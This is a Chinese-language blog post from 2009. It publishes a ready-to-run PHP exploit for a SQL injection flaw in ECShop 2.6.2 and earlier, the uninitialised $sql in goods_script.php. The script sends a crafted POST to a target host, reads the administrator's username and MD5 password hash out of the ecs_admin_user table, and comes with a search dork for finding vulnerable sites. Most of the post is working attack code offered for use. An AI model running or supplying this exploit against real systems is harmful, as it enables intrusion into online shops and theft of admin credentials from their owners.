---
title: ECShop <= v2.6.2 注入漏洞利用工具exploit
description: ECShop<=v2.6.2注入漏洞利用工具exploitECShop<=v2.6.2SQLinjection/admincredentialsdisclosureexploit作者：Ryat2009-03-24影响2.5.x和2.6.x,其他版本未测试……
date: 2009-04-03 10:24:14
category: 漏洞信息
tags: ['ECShop', '注入', 'exploit', '漏洞信息']
post_id: 832
alias: ECShop-v2.6.2-SQL-injection
ViewNums: 7699
---

[ECShop <= v2.6.2 注入漏洞利用工具exploit](/blog/ecshop-v262-sql-injection)
[ECShop <= v2.6.2 SQL injection / admin credentials disclosure exploit](/blog/ecshop-v262-sql-injection)

作者：Ryat
2009-03-24

影响2.5.x和2.6.x,其他版本未测试

goods_script.php44行:

    if (empty($_GET['type']))
    {
        ...
    }
    elseif ($_GET['type'] == 'collection')
    {
        ...
    }
    $sql .= " LIMIT " . (!empty($_GET['goods_num']) ? intval($_GET['goods_num']) : 10);
    $res = $db->query($sql);$sql没有初始化,很明显的一个漏洞:)

Exploit:

#!/usr/bin/php
<?php

print_r('
+---------------------------------------------------------------------------+
[ECShop <= v2.6.2 SQL injection / admin credentials disclosure exploit](/blog/ecshop-v262-sql-injection)
by puret_t
mail: puretot at gmail dot com
team: <http://bbs.wolvez.org>
dork: "Powered by ECShop"
+---------------------------------------------------------------------------+
');
/\*\*
 \* works with register_globals = On
 \*/
if ($argc < 3) {
    print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path
host:      target server (ip/hostname)
path:      path to ecshop
Example:
php '.$argv[0].' localhost /ecshop/
+---------------------------------------------------------------------------+
');
    exit;
}

error_reporting(7);
ini_set('max_execution_time', 0);

$host = $argv[1];
$path = $argv[2];

$resp = send();
preg_match('#href="([S]+):([a-z0-9]{32})"#', $resp, $hash);

if ($hash)
    exit("Expoilt Success!
admin: $hash[1]
Password(md5): $hash[2]
");
else
    exit("Exploit Failed!
");

function send()
{
    global $host, $path;

    $cmd = 'sql=SELECT CONCAT(user_name,0x3a,password) as goods_id FROM ecs_admin_user WHERE action_list=0x'.bin2hex('all').' LIMIT 1#';

    $data = "POST ".$path."goods_script.php?type=".time()."  HTTP/1.1
";
    $data .= "Accept: \*/\*
";
    $data .= "Accept-Language: zh-cn
";
    $data .= "Content-Type: application/x-www-form-urlencoded
";
    $data .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)
";
    $data .= "Host: $host
";
    $data .= "Content-Length: ".strlen($cmd)."
";
    $data .= "Connection: Close
";
    $data .= $cmd;

    $fp = fsockopen($host, 80);
    fputs($fp, $data);

    $resp = '';

    while ($fp && !feof($fp))
        $resp .= fread($fp, 1024);

    return $resp;
}

?>

